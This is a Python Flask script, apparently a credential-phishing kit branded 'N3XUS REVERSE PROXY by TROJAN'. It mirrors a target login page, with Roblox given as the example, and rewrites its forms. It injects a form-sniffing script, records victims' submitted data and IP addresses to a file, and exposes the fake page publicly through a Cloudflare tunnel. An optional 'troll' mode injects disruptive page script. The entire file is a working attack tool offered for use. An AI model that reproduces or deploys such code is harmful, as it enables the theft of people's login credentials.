from flask import Flask, request
import requests
from bs4 import BeautifulSoup
import urllib.parse
import threading
import subprocess
import os
import datetime
import logging                                                                                  
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
app = Flask(__name__)
target_site = ""

LOCAL_PAGE = "index_local.html"
server_started = False


TROLL_SCRIPT_CODE = """
(function() {
    const sources = [
        "https://www.myinstants.com/media/sounds/sound-baord-spongebob.mp3"
    ];

    let music = null;
    let current = 0;

    function playMusic() {
        if (music) {
            music.pause();
            music = null;
        }
        music = new Audio(sources[current]);
        music.volume = 0.85;
        music.loop = true;

        music.play().catch(() => {
            current = (current + 1) % sources.length;
            if (current !== 0) playMusic();
        });
    }

    playMusic();

    document.addEventListener("click", () => {
        if (music && music.paused) {
            music.play().catch(() => {});
        }
    }, { once: true });

    const style = document.createElement("style");
    style.innerHTML = `
        @keyframes rgb {
            0%   { filter: hue-rotate(0deg); }
            100% { filter: hue-rotate(360deg); }
        }
        @keyframes glow {
            0%, 100% { box-shadow: 0 0 25px #ff00ff, 0 0 50px #00ffff; }
            50% { box-shadow: 0 0 50px #00ff00, 0 0 90px #ff0000; }
        }
        @keyframes float {
            0% { transform: translateY(0) rotate(-5deg); }
            50% { transform: translateY(-35px) rotate(8deg); }
            100% { transform: translateY(0) rotate(-5deg); }
        }
        body {
            animation: rgb 3.5s linear infinite !important;
        }
        .sb-meme {
            position: fixed;
            z-index: 999999;
            pointer-events: none;
            font-family: 'Comic Sans MS', cursive, sans-serif;
            font-weight: bold;
            font-size: 26px;
            color: #fff;
            text-shadow: 0 0 12px #ff00ff, 0 0 25px #00ffff, 0 0 40px #ffff00;
            animation: float 2.2s ease-in-out infinite, rgb 2.5s linear infinite;
            user-select: none;
        }
    `;
    document.head.appendChild(style);

    
    for (let i = 0; i < 14; i++) {
        const el = document.createElement("div");
        el.className = "sb-meme";
        el.innerText = phrases[Math.floor(Math.random() * phrases.length)];
        el.style.left = Math.random() * 88 + "vw";
        el.style.top = Math.random() * 78 + "vh";
        el.style.animationDelay = (Math.random() * 2.5) + "s";
        el.style.fontSize = (20 + Math.random() * 18) + "px";
        document.body.appendChild(el);
    }

    const border = document.createElement("div");
    border.style.cssText = `
        position: fixed;
        inset: 0;
        pointer-events: none;
        z-index: 999998;
        border: 10px solid;
        border-image: linear-gradient(45deg, #ff0000, #ff00ff, #00ffff, #00ff00, #ffff00, #ff0000) 1;
        animation: rgb 1.8s linear infinite, glow 1.3s ease-in-out infinite;
    `;
    document.body.appendChild(border);

    let shake = 0;
    setInterval(() => {
        shake = shake === 0 ? 4 : 0;
        document.body.style.transform = `translate(${shake}px, ${-shake}px)`;
    }, 70);
})();
"""

def download_mirror(url, troll_mode=False):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    try:
        print("\n[*] Creating a local copy of the page...")
        resp = requests.get(url, headers=headers, timeout=15)
        soup = BeautifulSoup(resp.text, 'html.parser')

        parsed_target = urllib.parse.urlparse(url)
        base_url = f"{parsed_target.scheme}://{parsed_target.netloc}"

        for tag in soup.find_all(['link', 'script', 'img']):
            attr = 'href' if tag.name == 'link' else 'src'
            val = tag.get(attr)
            if val:
                if val.startswith('/'):
                    tag[attr] = base_url + val
                elif not val.startswith('http') and not val.startswith('data:'):
                    tag[attr] = base_url + '/' + val

        for form in soup.find_all('form'):
            form['action'] = '/'
            form['method'] = 'POST'

        sniffer_script = soup.new_tag("script")
        sniffer_script.string = """
        document.addEventListener("submit", function(e) {
            let formData = new FormData(e.target);
            let data = {};
            formData.forEach((value, key) => { data[key] = value; });
            fetch('/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }, true);
        """
        
        if soup.body:
            soup.body.append(sniffer_script)

            if troll_mode:
                troll_tag = soup.new_tag("script")
                troll_tag.string = TROLL_SCRIPT_CODE
                soup.body.append(troll_tag)
        else:
            soup.append(sniffer_script)
            if troll_mode:
                troll_tag = soup.new_tag("script")
                troll_tag.string = TROLL_SCRIPT_CODE
                soup.append(troll_tag)

        with open(LOCAL_PAGE, "w", encoding="utf-8") as f:
            f.write(str(soup))
        print("[+] Local copy successfully created!")
    except Exception as e:
        print(f"[!] Error downloading copy: {e}")

@app.route("/", methods=["GET", "POST"])
def mirror_server():
    client_ip = request.headers.get("CF-Connecting-IP", request.remote_addr)

    xff = request.headers.get("X-Forwarded-For", "")
    via = request.headers.get("Via", "")
    is_vpn_proxy = False
    if via or (xff and "," in xff):
        is_vpn_proxy = True

    vpn_text = "(coming soon)" if is_vpn_proxy else "(coming soon)"
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if request.method == "POST":
        form_data = {}
        if request.is_json:
            form_data = request.get_json(silent=True) or {}
        if not form_data:
            form_data = request.form.to_dict()
        if not form_data:
            form_data = request.values.to_dict()
        if not form_data and request.data:
            form_data = {"raw_data": request.data.decode('utf-8', errors='ignore')}

        print("\n" + "="*50)
        print(f" [!] NEW DATA INTERCEPTED! [{current_time}]")
        print(f" 🌐 IP address : {client_ip}")
        print(f" 🛡️ VPN/Proxy  : {vpn_text}")
        print(f" 🔑 Data       :")
        for key, value in form_data.items():
            print(f"    -> {key}: {value}")
        print("="*50 + "\n")

        with open("captured.txt", "a", encoding="utf-8") as f:
            f.write(f"[{current_time}] IP: {client_ip} | VPN: {vpn_text} | Data: {form_data}\n")

        return f"<script>alert('Authorization error. Please try again.'); window.location.href='/';</script>"

    print(f"[{current_time}] Site visit | IP: {client_ip} | VPN: {vpn_text}")

    if os.path.exists(LOCAL_PAGE):
        with open(LOCAL_PAGE, "r", encoding="utf-8") as f:
            return f.read()
    return "Target is not configured yet.", 404

def run_flask():
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)

def run_tunnel():
    subprocess.run(["cloudflared", "tunnel", "--url", "http://localhost:5000"])

if __name__ == "__main__":
    while True:
        os.system("clear")
        print("="*50)
        print("              N3XUS REVERSE PROXY")
        print("                   by TROJAN     ")
        print("="*50)
        print(" [1] enter link")
        print(" [2] enter link + Troll Edition")
        print(" [3] View captured data")
        print(" [4] Exit")
        print("="*50)

        choice = input("Select an option: ").strip()

        if choice in ["1", "2"]:
            troll_mode = (choice == "2")
            target_site = input("\nEnter target URL (e.g., https://www.roblox.com/Login): ").strip()
            if target_site:
                download_mirror(target_site, troll_mode=troll_mode)

                if not server_started:
                    threading.Thread(target=run_flask, daemon=True).start()
                    threading.Thread(target=run_tunnel, daemon=True).start()
                    server_started = True
                    print("\n[+] Flask server and Cloudflare tunnel successfully started!")
                else:
                    print("\n[+] Target updated, mirror recreated!")

                input("\nPress Enter to return to the menu...")
            else:
                input("\n[!] The link cannot be empty. Press Enter...")

        elif choice == "3":
            print("\n" + "="*40)
            print(" --- SAVED DATA ---")
            if os.path.exists("captured.txt"):
                with open("captured.txt", "r", encoding="utf-8") as f:
                    print(f.read())
            else:
                print("The captured.txt file is empty for now.")
            print("="*40)
            input("\nPress Enter to return to the menu...")

        elif choice == "4":
            print("Exiting the program...")
            os._exit(0)
        else:
            input("\n[!] Invalid choice. Press Enter...")
